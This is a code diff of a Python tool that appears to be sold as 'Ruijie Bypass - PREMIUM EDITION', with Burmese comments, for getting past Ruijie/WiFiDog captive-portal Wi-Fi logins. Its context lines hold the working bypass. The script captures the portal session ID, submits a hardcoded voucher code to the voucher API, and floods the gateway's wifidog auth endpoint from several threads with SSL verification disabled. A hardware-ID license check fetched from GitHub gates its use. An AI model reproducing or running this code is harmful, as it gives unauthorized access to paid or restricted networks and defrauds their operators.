@@ -4,31 +4,33 @@ from urllib.parse import urlparse, parse_qs, urljoin
 # SSL Bypass
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# --- [Updated Raw Link] ---
+# --- [GitHub Raw Link] ---
 RAW_KEY_URL = "https://raw.githubusercontent.com/kokoarkar446-cloud/bypass-ruijie/refs/heads/main/Key.txt"
 LICENSE_FILE = "license.txt"
 
 # --- COLORS ---
-CYAN = "\033[96m"
-GREEN = "\033[92m"
 YELLOW = "\033[93m"
-MAGENTA = "\033[95m"
-WHITE = "\033[97m"
+GREEN = "\033[92m"
 RED = "\033[91m"
+CYAN = "\033[96m"
+WHITE = "\033[97m"
 RESET = "\033[0m"
 
 def banner():
     os.system('clear')
+    # ၁။ အဝါရောင် အပေါ်စည်း
     print(f"{YELLOW} ="*35)
-    print(f"{CYAN}" + r"""
-      ██████╗ ██╗   ██╗██╗     ██╗██╗███████╗
-      ██╔══██╗██║   ██║██║     ██║██║██╔════╝
-      ██████╔╝██║   ██║██║     ██║██║█████╗  
-      ██╔══██╗██║   ██║██║██   ██║██║██╔══╝  
-      ██║  ██║╚██████╔╝██║╚█████╔╝██║███████╗
-      ╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚════╝ ╚═╝╚══════╝
-    """)
-    print(f"        {MAGENTA}✨ Ruijie Bypass - PREMIUM EDITION ✨{RESET}")
+    
+    # ၂။ ဝါ၊ စိမ်း၊ နီ သုံးရောင်စပ် RUIJIE Logo
+    print(f"{YELLOW}      ██████╗ ██╗   ██╗██╗" + f"{GREEN}     ██╗██╗███████╗")
+    print(f"{YELLOW}      ██╔══██╗██║   ██║██║" + f"{GREEN}     ██║██║██╔════╝")
+    print(f"{YELLOW}      ██████╔╝██║   ██║██║" + f"{GREEN}     ██║██║█████╗  ")
+    print(f"{GREEN}      ██╔══██╗██║   ██║██║" + f"{RED}██   ██║██║██╔══╝  ")
+    print(f"{GREEN}      ██║  ██║╚██████╔╝██║" + f"{RED}╚█████╔╝██║███████╗")
+    print(f"{GREEN}      ╚═╝  ╚═╝ ╚═════╝ ╚═╝" + f"{RED} ╚════╝ ╚═╝╚══════╝")
+    
+    # ၃။ အနီရောင် Edition စာသား
+    print(f"        {RED}✨ Ruijie Bypass - PREMIUM EDITION ✨{RESET}")
     print(f"{YELLOW} ="*35 + f"{RESET}\n")
 
 def get_hwid():
@@ -41,6 +43,7 @@ def verify():
     hwid = get_hwid()
     banner()
     
+    # Auto Login
     if os.path.exists(LICENSE_FILE):
         print(f"{GREEN}[✓] Status: Active (Auto Login Success){RESET}")
         return True
@@ -51,7 +54,6 @@ def verify():
         print(f"{WHITE}[+] YOUR DEVICE ID: {YELLOW}{hwid}{RESET}")
         key = input(f"{YELLOW}[?] ENTER LICENSE KEY: {RESET}").strip()
         
-        # Key စစ်ဆေးခြင်း
         if f"{key}:{hwid}" in resp:
             with open(LICENSE_FILE, "w") as f:
                 f.write(key)
@@ -76,7 +78,7 @@ def high_speed_pulse(link):
     while True:
         try:
             session.get(link, timeout=10, verify=False)
-            # Bypass Status ကို အစိမ်းရောင်ဖြင့် ပြသခြင်း
+            # Bypass Status - အစိမ်းရောင်
             print(f"{GREEN}[✓] Bypass Active | Pulse: [{random.randint(100,450)}ms]{RESET}      ", end="\r")
         except:
             break
@@ -92,6 +94,7 @@ def start_bypass():
                 time.sleep(10)
                 continue
 
+            # Capture Logic
             r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
             r1 = session.get(r.url, verify=False, timeout=5)
             
@@ -104,6 +107,7 @@ def start_bypass():
                 print(f"{GREEN}[✓] SID Captured: {sid[:15]}...{RESET}")
                 p_host = f"{urlparse(r.url).scheme}://{urlparse(r.url).netloc}"
                 
+                # Voucher Login
                 session.post(f"{p_host}/api/auth/voucher/", 
                              json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, 
                              timeout=10)
@@ -112,7 +116,7 @@ def start_bypass():
                 port = parse_qs(urlparse(r.url).query).get('gw_port', ['2060'])[0]
                 auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
                 
-                # Thread စာကြောင်းကို အနီရောင်ဖြင့် ပြသခြင်း
+                # Thread Start - အနီရောင်
                 print(f"{RED}[*] ⚡ Launching Stability Pulse Threads... ⚡{RESET}")
                 for _ in range(5):
                     threading.Thread(target=high_speed_pulse, args=(auth_link,), daemon=True).start()
